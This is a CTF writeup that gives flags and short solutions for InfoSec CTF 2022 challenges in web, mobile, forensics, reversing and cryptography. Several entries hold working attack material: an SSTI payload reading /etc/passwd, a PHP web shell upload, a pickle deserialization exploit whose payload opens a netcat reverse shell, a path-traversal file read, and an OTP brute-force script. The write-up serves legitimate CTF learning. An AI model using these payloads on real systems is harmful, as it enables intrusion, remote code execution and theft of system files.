# InfoSec CTF 2022 Writeups

**Name**: Aryan V S

**CTF Name**: a-r-r-o-w (Rank #14)

**Team**: a-r-r-o-w

**University**: PES University

The writeups aren't very detailed due to prior commitments and lack of time. Thank you for organizing the CTF, the challenges were fun!

### Flags

```
double or nothing: FLAG{easyPeaZY_right?}
silly freemason: FLAG{EASYASONETWOTHREE}
easy_temp: FLAG{5c939bcff0185b0b9e497ddb51e10449}
t-jungle: FLAG{852844f3594b5a7befcb90d3a4402d74}
magic-bytes: FLAG{PNG_N0T_JPEG}
exclusive: FLAG{Great_efforts_Great_results}
rick secret: FLAG{48eddb530a00805eb30da5e51a033f8a}
gold: FLAG{BREAKING_XOR_WITHOUT_KEY_IS_COOL_!}
xerox: flag{You_Need_To_Parse_MFT}
outofsight: FLAG{S3cr3t5_N3v3r_Diiiiiiie}
twins: flag{5C:A6:E6:FB:24:42_matrix999}
cool_pyc: FLAG{HereIAM_HidingHere!}
anonymax: flag{710983515952e0df8fa9d09f6fec0381c886a3b343f1d3111a234eca52444006}
evilaccess: 85d5e7e14c9d2927c4b36dd9ec700f99
cv_pwner: FLAG{84c6f17842921628426d71fa3f2864c4}
rooter: {R00T_AND_JNI_Flag_R0ck!ng}
es-es-pin: {tH!s_!iS_SSL_unP!nn3R}
otp_slayer: {b9e646b72c5ed6237918fa4772dbd8fd}
asm: FLAG{_K3eb_0n_Sh1ning_}
```

<br />

### easy_temp -	100 -	Web Security

Server Side Template Injection

Payload: `{{ get_flashed_messages.globals.builtins.open("/etc/passwd").read() }}`

<br />

### T-Jungle - 100 - Web Security

PHP Magic Hash Collision

Input: `240610708`

<br />

### exclus1ve - 100 -	Malware Reverse Engineering

```py
from Crypto.Util.number import long_to_bytes
from pwn import xor

s = long_to_bytes(0x913130974233505)[::-1] + long_to_bytes(0x410D1F25162B1A04)[::-1] + long_to_bytes(0x7150B172B3E2706)[::-1] + long_to_bytes(0x1F15380740070B1C)[::-1] + long_to_bytes(24)
key = b'Cyb3rTalents'

print(xor(s, key).decode())
```

<br />

### Magic Byte5 - 100 -	Digital Forensics

Fix first 8 bytes of image header to the header of PNG.

`80 50 4e 47 0d 0a 1a 0a`

<br />

### Out of Sight - 100 - Digital Forensics

- Use binwalk on image to extract zip archive
- Password for archive can be found in image metadata under "Artist" (`Sup3xrCx3t`)

<br />

### Decryptor - 100 - Mobile Security

- Use `jadx` to decompile APK
- Find relevant strings for `aes_flag` and `key` in `res/values/strings.xml`
- Decrypt using AES

```py
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.number import *

aes_flag = b'4BQ30DuTvk8SeGJL7XQjbvGgarLwS8wicdqZTOqp/KI='
enc = base64.b64decode(aes_flag)
key = long_to_bytes(int(hashlib.sha256(b'Japan2Italy').hexdigest(), 16))
iv = long_to_bytes(int(hashlib.md5(b'Japan2Italy').hexdigest(), 16))
aes = AES.new(key = key, iv = iv, mode = AES.MODE_CBC)
print(aes.decrypt(enc))
```

<br />

### double or nothing - 100 -	Cryptography

Decode Base64 two times

<br />

### Silly Freemason - 100 -	Cryptography

Pigpen Cipher

<br />

### Extreme bypass - 300 - Web Security

Unsolved

<br />

### ASM_v3 - 300 - Malware Reverse Engineering

Copy all necessary values from `cmp eax` statements. Pay attention to the fact that some statements are combined or have other operations. We need to handle each individually.

ASM file:

```asm
fx:
        push    rbp
        mov     rbp, rsp
        mov     QWORD PTR [rbp-24], rdi
        mov     rax, QWORD PTR [rbp-24]
        mov     eax, DWORD PTR [rax]
        cmp     eax, 70
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 4
        mov     eax, DWORD PTR [rax]
        cmp     eax, 76
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 8
        mov     eax, DWORD PTR [rax]
        add     eax, eax
        cmp     eax, 130
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 12
        mov     eax, DWORD PTR [rax]
        cmp     eax, 71
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 16
        mov     eax, DWORD PTR [rax]
        cmp     eax, 123
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 20
        mov     eax, DWORD PTR [rax]
        cmp     eax, 95
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 24
        mov     eax, DWORD PTR [rax]
        sub     eax, 75
        cmp     eax, 2
        ja      .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 28
        mov     eax, DWORD PTR [rax]
        cmp     eax, 48
        jle     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 32
        mov     eax, DWORD PTR [rax]
        cmp     eax, 100
        jle     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 28
        mov     edx, DWORD PTR [rax]
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 32
        mov     eax, DWORD PTR [rax]
        add     eax, edx
        cmp     eax, 152
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 36
        mov     eax, DWORD PTR [rax]
        cmp     eax, 98
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 40
        mov     eax, DWORD PTR [rax]
        test    eax, eax
        je      .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 44
        mov     eax, DWORD PTR [rax]
        cmp     eax, 48
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 48
        mov     eax, DWORD PTR [rax]
        cmp     eax, 110
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 52
        mov     eax, DWORD PTR [rax]
        cmp     eax, 95
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 56
        mov     eax, DWORD PTR [rax]
        cmp     eax, 83
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 60
        mov     eax, DWORD PTR [rax]
        cmp     eax, 104
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 64
        mov     eax, DWORD PTR [rax]
        cmp     eax, 49
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 68
        mov     eax, DWORD PTR [rax]
        cmp     eax, 110
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 72
        mov     eax, DWORD PTR [rax]
        cmp     eax, 105
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 76
        mov     eax, DWORD PTR [rax]
        cmp     eax, 110
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 80
        mov     eax, DWORD PTR [rax]
        cmp     eax, 103
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 84
        mov     eax, DWORD PTR [rax]
        cmp     eax, 95
        jne     .L2
        mov     rax, QWORD PTR [rbp-24]
        add     rax, 88
        mov     eax, DWORD PTR [rax]
        cmp     eax, 125
        jne     .L2
        mov     eax, 1
        jmp     .L3
.L2:
        mov     eax, 0
.L3:
        mov     DWORD PTR [rbp-4], eax
        nop
        pop     rbp
        ret
```

Script:

```py
import string

alphabet = string.ascii_letters + string.digits + '_'
s = """
cmp     eax, 70
cmp     eax, 76
cmp     eax, 65
cmp     eax, 71
cmp     eax, 123
cmp     eax, 95
cmp     eax, 75
cmp     eax, 51
cmp     eax, 101
cmp     eax, 98
---sus---cmp     eax, 0
cmp     eax, 48
cmp     eax, 110
cmp     eax, 95
cmp     eax, 83
cmp     eax, 104
cmp     eax, 49
cmp     eax, 110
cmp     eax, 105
cmp     eax, 110
cmp     eax, 103
cmp     eax, 95
cmp     eax, 125
""".strip().splitlines()

result = ''

for line in s:
    line = line.split()
    result += chr(int(line[2]))

result = list(result)

for i in alphabet:
    result[40 // 4] = i
    print(''.join(result))
```

<br />

### Ph0n3	hard - 300 - Digital Forensics

Unsolved

<br />

### OTP_slayer - 300 - Mobile Security

Create an account and look at the response. It gives OTP as `446620` but this doesn't work when trying to login. Just iteratively bruteforce until the OTP `446680` eventually works giving us the flag. We can iteratively bruteforce based on the hint:

```
Projected OTP is: Next OTP May be Correct
UserName/Password/OTP is InCorrect<br />
<b>Warning</b>:  Undefined variable $otp_value in <b>/var/www/html/verifyOTP.php</b> on line <b>86</b><br />
<br />
<b>Warning</b>:  Undefined variable $otp_value in <b>/var/www/html/verifyOTP.php</b> on line <b>87</b><br />
Projected OTP is: Next OTP May be Correct
```

```py
import requests
import json

# url = 'http://18.184.166.9:3333/newUser.php'
# session = requests.Session()

data = {
    'username': 'testuser692',
    'password': 'password123',
}

# # r = session.post(url, data = data)
# # print(r.text)
# # print(r.headers)

# # 446620

# # for i in range(100000, 999999):
url = 'http://18.184.166.9:3333/verifyOTP.php'
# data.update({'otp': 446620})
# r = session.post(url, data = data)
# # print(i)
# print(r.text)
# print()

import asyncio
import aiohttp

async def post_async(url: str, data: dict):
    async with aiohttp.ClientSession() as session:
        print(data)
        async with session.post(url, data=data) as response:
            return await response.text()

async def post_async_with_rate_limit(url: str, data: dict):
    async with asyncio.Semaphore(10):
        return await post_async(url, data)

async def main ():
    with open('output.txt', 'a') as file:
        for i in range(446620, 999999):
            data.update({'otp': i})
            result = await post_async_with_rate_limit(url, data)
            if 'InCorrect' not in result:
                print(result)
            file.write(result + '\n')

asyncio.run(main())
```

<br />

### IPad - 300 - Cryptography

Unsolved

<br />

### CV_pwner - 200 - Web Security

Submit a PDF but intercept request using Burp. Keep `Content-Type` the same as `application/pdf` but change file name to anything you want and file extension to `.php`. Change contents as well to `<?php echo system($_GET["cmd"]); ?>`.

Now, send a request to `https://URL/file.php?cmd=cat%20/etc/passwd`.

<br />

### R!ck secrets - 200 - Web Security

Pickle Deserialization vulnerability in `rememberme` cookie.

```py
# https://davidhamann.de/2020/04/05/exploiting-python-pickle/

import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc IP PORT > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = {
        'username': 'test',
        'password': 'test',
        'data': RCE()
    }
    pickled = pickle.dumps(pickled)
    print(base64.urlsafe_b64encode(pickled).decode())
```

<br />

### Anonymax - 200 - Web Security

Submit the following for upload and then visit the upload page link.

```html
<!DOCTYPE html>
<html>
<head>
    <script>
        var fileContent = <?php echo json_encode(file_get_contents('../../../../flag.txt', true)); ?>;
    </script>
</head>
<body>
    <h1>Contents of example.txt:</h1>
    <div id="content"></div>

    <script>
        document.getElementById('content').textContent = fileContent;
    </script>
</body>
</html>
```

<br />

### Memelord - 200 - Web Security

Unsolved

<br />

### Cool PYC - 200 - Malware Reverse Engineering

Use `pyi-archive_viewer` on the provided file and extract. We can find a PYC file containing the following contents:

```
<TRUNCATED>
ztell me your name bro => z:==========================================================z$RkxBR3tIZXJlSUFNX0hpZGluZ0hlcmUhfQ==�z pick a number between 1 & 10 => zcorrct you found it well donez�no my number is smaller XDzno my number is bigger XPz#you didnt guess it , bad luck bro !z;===========================================================N)
<TRUNCATED>
```

Decrypt the Base64 string.

<br />

### Xerox	- 200 - Digital Forensics

Unsolved

<br />

### tw1ns - 200 - Digital Forensics

Analyze file to find the relevant answers.

<br />

### Evil Access - 200 - Mobile Security

Use `apktool d evil-access.apk -o source`. In the source directory created, we can find a `kernel_blob.bin` file in `assets/flutter_assets/`. Use strings on that file and grep for `MyApp` (idea from previous ctf writeups): `grep -A 50 -B 50 -r -i --text MyApp`. This will give us the required source code and we obtain some hex values. Combining the values gives us the flag.

```py
x = ""
x += "85d"
x += "5e7"
x += "e14"
x += "c9d"
x += "292"
x += "7c4b36dd"
x += "9ec70"
x += "0f99"

print(x)
```

<br />

### Rooter - 200 - Mobile Security

Decompile the APK using `jadx` and `apktool`. Analyze using Ghidra or IDA the `lib/x86_64/libjunroot.so` file and find relevant AES values from lib file. Perform normal AES Decryption for first block and concatenate remaining part of flag that is not encrypted.

```py
from Crypto.Util.number import *
from Crypto.Cipher import AES
from pwn import *

enc = 0x3B6F3BDD4717A4C53D668CCD50F76AD361675F5230636B216E677D
enc = long_to_bytes(enc)
while len(enc) % 16 != 0:
    enc += b'\x00'
key = b'123456789abcdcc\x00'

aes = AES.new(key = key, mode = AES.MODE_ECB)
print(aes.decrypt(enc[:16]) + enc[16:])
```

<br />

### es-es-pin - 200 - Mobile Security

Similar process to Rooter.

```py
from Crypto.Util.number import *
from Crypto.Cipher import AES

url = 0x53FBC1E82C8D923A25F484058C2D6C0674794E6D4F2E747874
url = long_to_bytes(url)

while len(url) % 16 != 0:
    url += b'\x00'

key = b'123456789abcdcc\x00'

aes = AES.new(key = key, mode = AES.MODE_ECB)
print(aes.decrypt(url)[:16] + url[16:])

# 0b78ujMqNsvbqWeRtyNmO.txt
```

After finding text file, visit the URL link from the decompiled source code that can be obtained using `jadx`.

<br />

### Riv - 200 - Cryptography

Text Book RSA.

```py
from Crypto.Util.number import *
from gmpy2 import gmpy2

n=16147111734460800396004592670421468929337203190257626881606012921435838643682486839638969919126011524499609044486548371078702382995209772340989167246102495015107720926778322642181742667106589581285868164349155811160988904172418976556526686941401355790760512930187413129387612432578824982589943249726538251843134494371205312446417743116926422296053343015812167511415786346049084785782293317209821769860285282759086233935620489199236381431918736093892708407699240019615286528179061459943754101031540022336347845482100465143834304730276518967143705254840069157949656506425821092281518997158195127056924848015561721144141
e=5
ct=111558645679006394985384019922106344256390245431545304101942130922177467904633500612867289903603121371437773246170390092045034734209187474652129636135263800118498886868963176721482556951317449397588032806400411456314451471867958481146150654899999731639797463584634515914586016365684332024632542448233024172820905812188634527134114383199826766449312686149601042672866478590545407942592434984704530370917178774467061817245773716440844189325157951539629919700395694364926837338497933420304953156481808563506013769102906246159631644750831210893

print(long_to_bytes(gmpy2.iroot(ct, 5)[0]).decode())
```

<br />

### G(OLD) - 200 - Cryptography

Manual XOR key bruteforce by knowing prefix of flag `FLAG{`. Key comes out to be `XORISBAD`.
